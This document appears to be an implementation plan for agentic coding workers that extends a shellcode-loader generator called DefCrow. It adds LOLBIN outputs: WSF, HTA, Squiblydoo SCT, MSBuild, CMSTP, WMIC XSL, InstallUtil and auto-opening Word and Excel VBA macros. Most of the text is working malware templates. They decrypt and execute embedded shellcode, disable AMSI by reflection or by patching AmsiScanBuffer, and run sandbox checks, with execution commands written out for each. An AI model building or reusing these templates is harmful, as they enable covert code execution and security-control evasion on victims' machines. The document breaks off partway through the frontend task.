# DefCrow LOLBIN Output Extension — Implementation Plan (Plan 4)

> **For agentic workers:** Use superpowers:subagent-driven-development. Steps use checkbox (`- [ ]`) syntax.

**Goal:** Tambah 10 output type baru ke DefCrow: WSF, HTA, Regsvr32 SCT (Squiblydoo), MSBuild csproj, CMSTP INF, WMIC XSL, InstallUtil .NET DLL, Rundll32 (DLL alias), DOCX VBA macro (.bas text), XLSX VBA macro (.bas text). Semua dengan OPSEC modern 2024/2025.

**Architecture decisions (sudah dikonfirmasi):**
- Script LOLBIN: pure Tera render → text file (no rustc, ~50ms)
- Office macros: output `.bas` text saja — user copy-paste manual ke Office (no ZIP/CFBF manipulation)
- InstallUtil: server-side `csc.exe`/`mcs` untuk compile C#
- Rundll32: alias dari existing DLL path dengan named export hint

**Tech additions:** Tera (existing), tempfile (untuk csc.exe staging), no new heavy deps.

**Prerequisite:** Plan 1-3 complete (commit c350a21).

---

## File Map

| File | Action | Responsibility |
|---|---|---|
| `template-engine/src/lib.rs` | Modify | Extend `LoaderType` enum (add 10 variants), add `OutputCategory`, add `generate_script_source()` |
| `template-engine/templates/script/wsf.xml.tera` | Create | WSF with JScript shellcode loader |
| `template-engine/templates/script/hta.tera` | Create | HTA with VBScript shellcode loader |
| `template-engine/templates/script/regsvr32.sct.tera` | Create | Squiblydoo scriptlet |
| `template-engine/templates/script/msbuild.csproj.tera` | Create | MSBuild inline C# task |
| `template-engine/templates/script/cmstp.inf.tera` | Create | CMSTP INF file |
| `template-engine/templates/script/wmic.xsl.tera` | Create | WMIC XSL stylesheet |
| `template-engine/templates/office/vba_word.bas.tera` | Create | Word VBA (Document_Open) |
| `template-engine/templates/office/vba_excel.bas.tera` | Create | Excel VBA (Workbook_Open) |
| `template-engine/templates/csharp/installutil.cs.tera` | Create | InstallUtil C# source |
| `web-server/src/builder/csharp_runner.rs` | Create | Invoke csc.exe / mcs |
| `web-server/src/api/generate.rs` | Modify | Branch by output category |
| `frontend/src/api/generate.ts` | Modify | Add new LoaderType union members |
| `frontend/src/pages/GeneratorPage.tsx` | Modify | Show 3-category selector |
| `frontend/src/components/ExecHint.tsx` | Create | Show execution command |

---

### Task 1: Extend LoaderType + OutputCategory + script_gen dispatcher

**Files:**
- Modify: `template-engine/src/lib.rs`

- [ ] **Step 1: Extend `LoaderType` enum**

In `template-engine/src/lib.rs`, find existing enum and replace:

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum LoaderType {
    // PE (compiled to Windows binary via rustc)
    Binary,
    Dll,
    AppDomain,
    Injector,
    Rundll32,

    // Script LOLBIN (pure text, no compilation)
    Wsf,
    Hta,
    Regsvr32Sct,
    MsBuild,
    Cmstp,
    WmicXsl,

    // Office VBA macro source (.bas text — user paste manually)
    DocxMacro,
    XlsxMacro,

    // .NET LOLBIN (compiled with csc.exe / mcs)
    InstallUtil,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OutputCategory {
    PeCompiled,    // Rust source → rustc
    ScriptText,    // Tera render → text file
    VbaText,       // Tera render → .bas text (copy-paste manually)
    DotNetCompiled, // C# source → csc.exe
}

impl LoaderType {
    pub fn category(self) -> OutputCategory {
        use LoaderType::*;
        match self {
            Binary | Dll | AppDomain | Injector | Rundll32 => OutputCategory::PeCompiled,
            Wsf | Hta | Regsvr32Sct | MsBuild | Cmstp | WmicXsl => OutputCategory::ScriptText,
            DocxMacro | XlsxMacro => OutputCategory::VbaText,
            InstallUtil => OutputCategory::DotNetCompiled,
        }
    }

    pub fn output_extension(self) -> &'static str {
        use LoaderType::*;
        match self {
            Binary | Injector => "exe",
            Dll | Rundll32 | InstallUtil => "dll",
            AppDomain => "dll",  // also has .config sibling
            Wsf => "wsf",
            Hta => "hta",
            Regsvr32Sct => "sct",
            MsBuild => "csproj",
            Cmstp => "inf",
            WmicXsl => "xsl",
            DocxMacro | XlsxMacro => "bas",
        }
    }

    pub fn exec_command(self, filename: &str) -> String {
        use LoaderType::*;
        match self {
            Binary | Injector => filename.to_string(),
            Dll => format!("rundll32 {},DllMain", filename),
            Rundll32 => format!("rundll32 {},EntryPoint", filename),
            AppDomain => format!("Place {} + .config near host .exe; .NET loads it on startup", filename),
            Wsf => format!("wscript.exe {}", filename),
            Hta => format!("mshta.exe {}", filename),
            Regsvr32Sct => format!("regsvr32 /u /s /n /i:{} scrobj.dll", filename),
            MsBuild => format!("MSBuild.exe {}", filename),
            Cmstp => format!("cmstp.exe /au {}", filename),
            WmicXsl => format!("wmic os get /format:\"{}\"", filename),
            DocxMacro => "Open Word → Alt+F11 → ThisDocument → paste contents → save as .docm".to_string(),
            XlsxMacro => "Open Excel → Alt+F11 → ThisWorkbook → paste contents → save as .xlsm".to_string(),
            InstallUtil => format!("installutil.exe /logfile= /LogToConsole=false /U {}", filename),
        }
    }
}
```

- [ ] **Step 2: Add `generate_script_source()` and `generate_vba_source()`**

After existing `generate_loader_source()`:

```rust
pub fn generate_script_source(config: &LoaderConfig) -> Result<String, String> {
    let mut tera = build_tera_with_helpers()?;
    let template_name = match config.loader_type {
        LoaderType::Wsf         => "script/wsf.xml.tera",
        LoaderType::Hta         => "script/hta.tera",
        LoaderType::Regsvr32Sct => "script/regsvr32.sct.tera",
        LoaderType::MsBuild     => "script/msbuild.csproj.tera",
        LoaderType::Cmstp       => "script/cmstp.inf.tera",
        LoaderType::WmicXsl     => "script/wmic.xsl.tera",
        _ => return Err(format!("not a script type: {:?}", config.loader_type)),
    };
    let ctx = build_template_context(config)?;
    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_vba_source(config: &LoaderConfig) -> Result<String, String> {
    let mut tera = build_tera_with_helpers()?;
    let template_name = match config.loader_type {
        LoaderType::DocxMacro => "office/vba_word.bas.tera",
        LoaderType::XlsxMacro => "office/vba_excel.bas.tera",
        _ => return Err(format!("not a VBA type: {:?}", config.loader_type)),
    };
    let ctx = build_template_context(config)?;
    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_csharp_source(config: &LoaderConfig) -> Result<String, String> {
    let mut tera = build_tera_with_helpers()?;
    let ctx = build_template_context(config)?;
    tera.render("csharp/installutil.cs.tera", &ctx).map_err(|e| e.to_string())
}
```

`build_tera_with_helpers()` and `build_template_context()` are refactors of existing inline logic in `generate_loader_source()` — extract them to private helper functions.

- [ ] **Step 3: Register new template directories**

Find existing Tera initialization and ensure it globs `templates/**/*.tera` (with `**`), not just top-level.

- [ ] **Step 4: Run check**

```bash
cargo check -p template-engine 2>&1 | tail -5
```

Expected: clean compile.

- [ ] **Step 5: Commit**

```bash
git add template-engine/src/lib.rs
git commit -m "feat(template-engine): extend LoaderType + add script/vba/csharp dispatch"
```

---

### Task 2: WSF + HTA templates

**Files:**
- Create: `template-engine/templates/script/wsf.xml.tera`
- Create: `template-engine/templates/script/hta.tera`

- [ ] **Step 1: Create `templates/script/wsf.xml.tera`**

```xml
<?xml version="1.0" encoding="utf-8"?>
<package>
<job id="{{ v.job_id }}">
<script language="JScript">
<![CDATA[
// AMSI bypass via reflection (Stage 1)
function {{ v.fn_amsi }}() {
    try {
        var asm = new ActiveXObject("System.Reflection.Assembly");
        var amsi = asm.GetType("System.Management.Automation.AmsiUtils");
        if (amsi !== null) {
            var f = amsi.GetField("amsiInitFailed", 36);  // NonPublic | Static
            f.SetValue(null, true);
        }
    } catch (e) {}
}

// Shellcode storage (XOR-encrypted, multi-byte key)
var {{ v.var_sc }} = "{{ shellcode_hex }}";
var {{ v.var_key }} = "{{ key_hex }}";

function {{ v.fn_hex2arr }}(h) {
    var a = []; for (var i = 0; i < h.length; i += 2) {
        a.push(parseInt(h.substr(i, 2), 16));
    } return a;
}

function {{ v.fn_decrypt }}(data, key) {
    var out = []; for (var i = 0; i < data.length; i++) {
        out.push(data[i] ^ key[i % key.length]);
    } return out;
}

// Execution via System.Reflection — no eval, no execScript
function {{ v.fn_exec }}() {
    {{ v.fn_amsi }}();
    var sc  = {{ v.fn_decrypt }}({{ v.fn_hex2arr }}({{ v.var_sc }}), {{ v.fn_hex2arr }}({{ v.var_key }}));

    var loader = new ActiveXObject("System.Reflection.Assembly");
    // Load and invoke a tiny .NET stub that takes byte[] and runs it via Marshal.GetDelegateForFunctionPointer
    // (stub is hex-embedded below; ~2KB)
    var stub_hex = "{{ v.dotnet_stub_hex }}";
    var stub_bytes = {{ v.fn_hex2arr }}(stub_hex);

    var asm = loader.Load(stub_bytes);
    var t   = asm.GetType("Stub.Loader");
    var mi  = t.GetMethod("Run");
    mi.Invoke(null, [sc]);
}

{{ v.fn_exec }}();
]]>
</script>
</job>
</package>
```

NOTE: `{{ v.dotnet_stub_hex }}` is a placeholder for now — Task 7 will produce the actual .NET stub bytes. For Task 2, hardcode a small NOP stub so the template compiles.

- [ ] **Step 2: Create `templates/script/hta.tera`**

```html
<html>
<head>
<title>{{ v.title }}</title>
<HTA:APPLICATION ID="{{ v.app_id }}"
                 APPLICATIONNAME="{{ v.app_name }}"
                 BORDER="thin"
                 BORDERSTYLE="normal"
                 CAPTION="yes"
                 SHOWINTASKBAR="no"
                 SINGLEINSTANCE="yes"
                 SYSMENU="yes"
                 WINDOWSTATE="minimize" />
</head>
<body>
<script language="VBScript">
Sub {{ v.sub_amsi }}()
    On Error Resume Next
    Dim asm
    Set asm = CreateObject("System.Reflection.Assembly")
    Dim amsi
    Set amsi = asm.GetType("System.Management.Automation.AmsiUtils")
    If Not amsi Is Nothing Then
        amsi.GetField("amsiInitFailed", 36).SetValue Nothing, True
    End If
End Sub

Sub {{ v.sub_run }}()
    Call {{ v.sub_amsi }}()

    Dim sc_hex, key_hex
    sc_hex  = "{{ shellcode_hex }}"
    key_hex = "{{ key_hex }}"

    Dim sc()
    ReDim sc(Len(sc_hex) / 2 - 1)
    Dim i
    For i = 0 To Len(sc_hex) / 2 - 1
        sc(i) = CInt("&H" & Mid(sc_hex, i * 2 + 1, 2)) Xor _
                CInt("&H" & Mid(key_hex, (i Mod (Len(key_hex) / 2)) * 2 + 1, 2))
    Next

    ' Load .NET stub and invoke
    Dim asm, loader
    Set loader = CreateObject("System.Reflection.Assembly")
    Dim stub_hex
    stub_hex = "{{ v.dotnet_stub_hex }}"
    Dim stub_bytes()
    ReDim stub_bytes(Len(stub_hex) / 2 - 1)
    For i = 0 To Len(stub_hex) / 2 - 1
        stub_bytes(i) = CInt("&H" & Mid(stub_hex, i * 2 + 1, 2))
    Next

    Set asm = loader.Load((stub_bytes))
    Dim t, mi
    Set t  = asm.GetType("Stub.Loader")
    Set mi = t.GetMethod("Run")
    mi.Invoke Nothing, Array((sc))
End Sub

Call {{ v.sub_run }}()
self.close
</script>
</body>
</html>
```

- [ ] **Step 3: Add unit test for template render**

`template-engine/tests/script_render.rs`:

```rust
use template_engine::*;

#[test]
fn wsf_renders_with_randomized_idents() {
    let cfg = LoaderConfig {
        loader_type:   LoaderType::Wsf,
        features:      vec![],
        encryption:    Encryption::Aes256,
        shellcode_hex: "fc4883e4f0".into(),
        key_hex:       "deadbeef".into(),
        iv_hex:        "0011223344556677".into(),
        pe_config:     None,
        appdomain_config: None,
    };
    let src = generate_script_source(&cfg).unwrap();
    assert!(src.contains("System.Management.Automation.AmsiUtils"));
    assert!(src.contains("fc4883e4f0"));
}

#[test]
fn hta_renders() {
    let cfg = LoaderConfig {
        loader_type:   LoaderType::Hta,
        features:      vec![],
        encryption:    Encryption::Aes256,
        shellcode_hex: "9090".into(),
        key_hex:       "ab".into(),
        iv_hex:        "00".into(),
        pe_config:     None,
        appdomain_config: None,
    };
    let src = generate_script_source(&cfg).unwrap();
    assert!(src.contains("HTA:APPLICATION"));
}
```

- [ ] **Step 4: Run tests**

```bash
cargo test -p template-engine script_render 2>&1 | tail -10
```

Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add template-engine/
git commit -m "feat(template-engine): WSF + HTA templates with AMSI reflection bypass"
```

---

### Task 3: Regsvr32 SCT (Squiblydoo)

**Files:**
- Create: `template-engine/templates/script/regsvr32.sct.tera`

- [ ] **Step 1: Create template**

```xml
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="{{ v.progid }}"
    classid="{{{{ v.clsid }}}}"
    description="{{ v.desc }}"
    remotable="true">
    <script language="JScript">
    <![CDATA[
    function {{ v.fn_amsi }}() {
        try {
            var asm  = new ActiveXObject("System.Reflection.Assembly");
            var amsi = asm.GetType("System.Management.Automation.AmsiUtils");
            if (amsi !== null) {
                amsi.GetField("amsiInitFailed", 36).SetValue(null, true);
            }
        } catch (e) {}
    }

    function {{ v.fn_hex }}(h) {
        var a = []; for (var i = 0; i < h.length; i += 2)
            a.push(parseInt(h.substr(i, 2), 16));
        return a;
    }

    function {{ v.fn_xor }}(d, k) {
        var o = []; for (var i = 0; i < d.length; i++)
            o.push(d[i] ^ k[i % k.length]);
        return o;
    }

    function {{ v.fn_run }}() {
        {{ v.fn_amsi }}();
        var sc = {{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
                                {{ v.fn_hex }}("{{ key_hex }}"));
        var loader = new ActiveXObject("System.Reflection.Assembly");
        var asm = loader.Load({{ v.fn_hex }}("{{ v.dotnet_stub_hex }}"));
        asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
    }

    {{ v.fn_run }}();
    ]]>
    </script>
</registration>
</scriptlet>
```

- [ ] **Step 2: Test**

```rust
#[test]
fn sct_renders() {
    let cfg = LoaderConfig { loader_type: LoaderType::Regsvr32Sct, /* ... */ };
    let src = generate_script_source(&cfg).unwrap();
    assert!(src.contains("<scriptlet>"));
    assert!(src.contains("progid="));
}
```

```bash
cargo test -p template-engine sct_renders 2>&1 | tail -5
```

- [ ] **Step 3: Commit**

```bash
git commit -am "feat(template-engine): Squiblydoo SCT template"
```

---

### Task 4: MSBuild inline-task csproj

**Files:**
- Create: `template-engine/templates/script/msbuild.csproj.tera`

- [ ] **Step 1: Create template**

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="{{ v.target_name }}">
    <{{ v.task_name }} />
  </Target>

  <UsingTask
    TaskName="{{ v.task_name }}"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup />
    <Task>
      <Reference Include="System" />
      <Reference Include="System.Runtime.InteropServices" />
      <Using Namespace="System" />
      <Using Namespace="System.Runtime.InteropServices" />
      <Using Namespace="System.Reflection" />
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.IO;
        using System.Net;
        using System.Reflection;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class {{ v.task_name }} : Task, ITask {
            [DllImport("kernel32")] static extern IntPtr {{ v.fn_valloc }}(IntPtr a, uint s, uint t, uint p);
            [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint flags, IntPtr id);
            [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);

            static void {{ v.fn_amsi }}() {
                try {
                    var t = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
                    if (t != null) {
                        var f = t.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
                        if (f != null) f.SetValue(null, true);
                    }
                } catch {}
            }

            static byte[] {{ v.fn_decrypt }}(byte[] data, byte[] key) {
                var o = new byte[data.Length];
                for (int i = 0; i < data.Length; i++) o[i] = (byte)(data[i] ^ key[i % key.Length]);
                return o;
            }

            static byte[] {{ v.fn_hex }}(string h) {
                var b = new byte[h.Length / 2];
                for (int i = 0; i < b.Length; i++)
                    b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
                return b;
            }

            public override bool Execute() {
                {{ v.fn_amsi }}();

                byte[] sc  = {{ v.fn_decrypt }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
                                              {{ v.fn_hex }}("{{ key_hex }}"));

                IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
                Marshal.Copy(sc, 0, mem, sc.Length);
                IntPtr h = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(h, 0xFFFFFFFF);
                return true;
            }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

- [ ] **Step 2: Test + commit**

```bash
cargo test -p template-engine msbuild
git commit -am "feat(template-engine): MSBuild inline C# task template"
```

---

### Task 5: CMSTP INF + WMIC XSL

**Files:**
- Create: `template-engine/templates/script/cmstp.inf.tera`
- Create: `template-engine/templates/script/wmic.xsl.tera`

- [ ] **Step 1: `cmstp.inf.tera`**

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,{{ v.scriptlet_url }}

[Strings]
ServiceName="{{ v.service_name }}"
ShortSvcName="{{ v.short_name }}"
```

Where `{{ v.scriptlet_url }}` is a user-provided URL to the SCT (or a local file path).

- [ ] **Step 2: `wmic.xsl.tera`**

```xml
<?xml version="1.0"?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" version="1.0"
            xmlns:ms="urn:schemas-microsoft-com:xslt"
            xmlns:user="placeholder">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
function {{ v.fn_amsi }}() {
    try {
        var asm = new ActiveXObject("System.Reflection.Assembly");
        var amsi = asm.GetType("System.Management.Automation.AmsiUtils");
        if (amsi !== null) amsi.GetField("amsiInitFailed", 36).SetValue(null, true);
    } catch (e) {}
}
{{ v.fn_amsi }}();

var hex = "{{ shellcode_hex }}";
var key = "{{ key_hex }}";

function hex2arr(h) { var a=[]; for (var i=0; i<h.length; i+=2) a.push(parseInt(h.substr(i,2),16)); return a; }
function xor(d,k) { var o=[]; for (var i=0;i<d.length;i++) o.push(d[i] ^ k[i % k.length]); return o; }

var sc = xor(hex2arr(hex), hex2arr(key));
var loader = new ActiveXObject("System.Reflection.Assembly");
var asm = loader.Load(hex2arr("{{ v.dotnet_stub_hex }}"));
asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
]]>
</ms:script>
</stylesheet>
```

- [ ] **Step 3: Test + commit**

```bash
cargo test -p template-engine cmstp wmic
git commit -am "feat(template-engine): CMSTP INF + WMIC XSL templates"
```

---

### Task 6: VBA Word + Excel macro source

**Files:**
- Create: `template-engine/templates/office/vba_word.bas.tera`
- Create: `template-engine/templates/office/vba_excel.bas.tera`

- [ ] **Step 1: `vba_word.bas.tera`**

```vba
Attribute VB_Name = "{{ v.module_name }}"
Option Explicit

#If VBA7 Then
    Private Declare PtrSafe Function {{ v.fn_valloc }} Lib "kernel32" Alias "VirtualAlloc" _
        (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, _
         ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" _
        (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
    Private Declare PtrSafe Function {{ v.fn_callwp }} Lib "user32" Alias "CallWindowProcA" _
        (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, _
         ByVal Msg As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
    Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal name As String) As LongPtr
    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" _
        (ByVal hModule As LongPtr, ByVal name As String) As LongPtr
    Private Declare PtrSafe Function VirtualProtect Lib "kernel32" _
        (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
         ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
#End If

Private Sub {{ v.fn_amsi_patch }}()
    On Error Resume Next
    Dim amsiBase As LongPtr, scanAddr As LongPtr
    amsiBase = LoadLibraryA("amsi.dll")
    If amsiBase = 0 Then Exit Sub
    scanAddr = GetProcAddress(amsiBase, "AmsiScanBuffer")
    If scanAddr = 0 Then Exit Sub
    Dim oldP As Long
    VirtualProtect scanAddr, 6, &H40, oldP
    ' Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
    Dim patch(0 To 5) As Byte
    patch(0) = &HB8: patch(1) = &H57: patch(2) = &H0: patch(3) = &H7: patch(4) = &H80: patch(5) = &HC3
    RtlMoveMemory scanAddr, patch(0), 6
End Sub

Private Function {{ v.fn_hex2arr }}(hex As String) As Byte()
    Dim n As Long: n = Len(hex) \ 2
    Dim arr() As Byte: ReDim arr(0 To n - 1)
    Dim i As Long
    For i = 0 To n - 1
        arr(i) = CByte("&H" & Mid$(hex, i * 2 + 1, 2))
    Next
    {{ v.fn_hex2arr }} = arr
End Function

Private Function {{ v.fn_xor }}(data() As Byte, key() As Byte) As Byte()
    Dim n As Long: n = UBound(data)
    Dim k As Long: k = UBound(key) + 1
    Dim out() As Byte: ReDim out(0 To n)
    Dim i As Long
    For i = 0 To n
        out(i) = data(i) Xor key(i Mod k)
    Next
    {{ v.fn_xor }} = out
End Function

Private Sub {{ v.fn_exec }}()
    {% if SandboxUser in feature_names %}
    ' Sandbox checks
    If Application.Documents.Count < 1 Then Exit Sub
    If Application.RecentFiles.Count < 3 Then Exit Sub
    {% endif %}

    Call {{ v.fn_amsi_patch }}

    Dim sc_hex As String, key_hex As String
    sc_hex  = "{{ shellcode_hex }}"
    key_hex = "{{ key_hex }}"

    Dim raw() As Byte, key() As Byte, sc() As Byte
    raw = {{ v.fn_hex2arr }}(sc_hex)
    key = {{ v.fn_hex2arr }}(key_hex)
    sc  = {{ v.fn_xor }}(raw, key)

    Dim mem As LongPtr
    mem = {{ v.fn_valloc }}(0, UBound(sc) + 1, &H3000, &H40)
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    ' Execute via CallWindowProc — no CreateThread (cleaner heuristic)
    {{ v.fn_callwp }} mem, 0, 0, 0, 0
End Sub

' Auto-trigger when document opens
Public Sub Document_Open()
    Call {{ v.fn_exec }}
End Sub

' Alternate trigger: AutoOpen (older Office compatibility)
Public Sub AutoOpen()
    Call {{ v.fn_exec }}
End Sub
```

- [ ] **Step 2: `vba_excel.bas.tera`**

Same as Word but rename triggers:

```vba
' Replace Document_Open / AutoOpen with:
Public Sub Workbook_Open()
    Call {{ v.fn_exec }}
End Sub

Public Sub Auto_Open()
    Call {{ v.fn_exec }}
End Sub
```

(Place these in `ThisWorkbook` module instead of regular module — note in user-facing exec hint.)

- [ ] **Step 3: Test + commit**

```rust
#[test]
fn vba_word_renders_with_amsi_patch() {
    let cfg = LoaderConfig { loader_type: LoaderType::DocxMacro, ... };
    let src = generate_vba_source(&cfg).unwrap();
    assert!(src.contains("AmsiScanBuffer"));
    assert!(src.contains("Document_Open"));
    assert!(src.contains("CallWindowProcA"));
}
```

```bash
cargo test -p template-engine vba
git commit -am "feat(template-engine): Word + Excel VBA macros with AMSI patching"
```

---

### Task 7: InstallUtil C# + csc.exe runner

**Files:**
- Create: `template-engine/templates/csharp/installutil.cs.tera`
- Create: `web-server/src/builder/csharp_runner.rs`

- [ ] **Step 1: C# template**

```csharp
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Reflection;
using System.Runtime.InteropServices;

namespace {{ v.namespace }} {

    [RunInstaller(true)]
    public class {{ v.class_name }} : Installer {

        [DllImport("kernel32")]
        static extern IntPtr {{ v.fn_valloc }}(IntPtr a, uint s, uint t, uint p);

        [DllImport("kernel32")]
        static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint fl, IntPtr id);

        [DllImport("kernel32")]
        static extern uint WaitForSingleObject(IntPtr h, uint ms);

        static void {{ v.fn_amsi }}() {
            try {
                var t = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
                if (t != null) {
                    var f = t.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
                    if (f != null) f.SetValue(null, true);
                }
            } catch {}
        }

        static byte[] {{ v.fn_hex }}(string h) {
            var b = new byte[h.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
            return b;
        }

        static byte[] {{ v.fn_xor }}(byte[] d, byte[] k) {
            var o = new byte[d.Length];
            for (int i = 0; i < d.Length; i++) o[i] = (byte)(d[i] ^ k[i % k.Length]);
            return o;
        }

        public override void Uninstall(System.Collections.IDictionary state) {
            {{ v.fn_amsi }}();

            byte[] sc = {{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
                                       {{ v.fn_hex }}("{{ key_hex }}"));
            IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
            Marshal.Copy(sc, 0, mem, sc.Length);
            IntPtr h = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(h, 0xFFFFFFFF);
        }
    }
}
```

- [ ] **Step 2: csharp_runner**

```rust
// web-server/src/builder/csharp_runner.rs
use std::path::Path;
use std::process::Command;

pub fn compile_csharp(
    cs_path: &str,
    out_dll: &str,
) -> Result<(), String> {
    let compiler = which::which("csc").or_else(|_| which::which("mcs"))
        .map_err(|_| "neither csc.exe nor mcs (mono) found in PATH".to_string())?;

    let mut cmd = Command::new(&compiler);
    cmd.arg(format!("/out:{}", out_dll))
        .arg("/target:library")
        .arg("/reference:System.Configuration.Install.dll")
        .arg("/reference:System.dll")
        .arg("/optimize+")
        .arg(cs_path);

    let output = cmd.output().map_err(|e| e.to_string())?;
    if !output.status.success() {
        return Err(format!("csc failed: {}", String::from_utf8_lossy(&output.stderr)));
    }
    if !Path::new(out_dll).exists() {
        return Err(format!("output not created: {}", out_dll));
    }
    Ok(())
}
```

Add `which = "6"` to `web-server/Cargo.toml`.

- [ ] **Step 3: Wire + test + commit**

```bash
cargo check -p web-server
git commit -am "feat(server): C# InstallUtil template + csc.exe runner"
```

---

### Task 8: web-server generate.rs dispatch

**Files:**
- Modify: `web-server/src/api/generate.rs`

- [ ] **Step 1: Branch by category**

Replace the existing `run_build` body's compile section:

```rust
use template_engine::{OutputCategory, generate_script_source, generate_vba_source, generate_csharp_source};

// After loader_cfg is built:
let category = loader_cfg.loader_type.category();
let out_ext  = loader_cfg.loader_type.output_extension();
let out_path = job_dir.join(format!("loader.{}", out_ext));

match category {
    OutputCategory::PeCompiled => {
        // existing path: generate_loader_source + compile_loader + pe_sign
        jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Compiling Rust source...".into() });
        let source = generate_loader_source(&loader_cfg)?;
        let src_path = job_dir.join("loader_config.rs");
        std::fs::write(&src_path, &source)?;
        let crate_type = match loader_cfg.loader_type {
            LoaderType::Binary | LoaderType::Injector => "bin",
            _ => "cdylib",
        };
        compile_loader(src_path.to_str().unwrap(), &cfg.scaffold_rlib, out_path.to_str().unwrap(), crate_type, &tx)?;
        if let Some(pe_meta) = &req.pe_config {
            let _ = crate::builder::pe_sign::apply_pe_metadata(out_path.to_str().unwrap(), pe_meta, &tx);
        }
    }
    OutputCategory::ScriptText => {
        jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Rendering script template...".into() });
        let source = generate_script_source(&loader_cfg).map_err(|e| anyhow::anyhow!(e))?;
        std::fs::write(&out_path, source)?;
    }
    OutputCategory::VbaText => {
        jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Rendering VBA source (copy-paste into Office macro editor)...".into() });
        let source = generate_vba_source(&loader_cfg).map_err(|e| anyhow::anyhow!(e))?;
        std::fs::write(&out_path, source)?;
    }
    OutputCategory::DotNetCompiled => {
        jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Generating C# source...".into() });
        let cs_source = generate_csharp_source(&loader_cfg).map_err(|e| anyhow::anyhow!(e))?;
        let cs_path = job_dir.join("Loader.cs");
        std::fs::write(&cs_path, &cs_source)?;
        jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Compiling C# with csc.exe...".into() });
        crate::builder::csharp_runner::compile_csharp(cs_path.to_str().unwrap(), out_path.to_str().unwrap())?;
    }
}

// Continue to download_id stamping (unchanged):
let download_id = uuid::Uuid::new_v4().to_string();
let dl_link = std::path::PathBuf::from(&cfg.artifacts_dir).join(&download_id);
std::fs::write(dl_link.with_extension("path"), out_path.to_str().unwrap())?;
jobs.set_status(&job_id, JobStatus::Done { download_id });
```

(Adapt error types — existing code uses `String` errors, keep consistent.)

- [ ] **Step 2: Add request type mapping for new variants**

In the `match req.loader_type.as_str()` block, add:

```rust
"Wsf"         => LoaderType::Wsf,
"Hta"         => LoaderType::Hta,
"Regsvr32Sct" => LoaderType::Regsvr32Sct,
"MsBuild"     => LoaderType::MsBuild,
"Cmstp"       => LoaderType::Cmstp,
"WmicXsl"     => LoaderType::WmicXsl,
"DocxMacro"   => LoaderType::DocxMacro,
"XlsxMacro"   => LoaderType::XlsxMacro,
"InstallUtil" => LoaderType::InstallUtil,
"Rundll32"    => LoaderType::Rundll32,
```

- [ ] **Step 3: Test + commit**

```bash
cargo check -p web-server
cargo test -p web-server
git commit -am "feat(server): generate.rs dispatch by output category (4 paths)"
```

---

### Task 9: Frontend LoaderType selector + ExecHint

**Files:**
- Modify: `frontend/src/api/generate.ts`
- Modify: `frontend/src/pages/GeneratorPage.tsx`
- Create: `frontend/src/components/ExecHint.tsx`

- [ ] **Step 1: Update LoaderType type**

```typescript
export type LoaderType =
  | 'Binary' | 'Dll' | 'AppDomain' | 'Injector' | 'Rundll32'
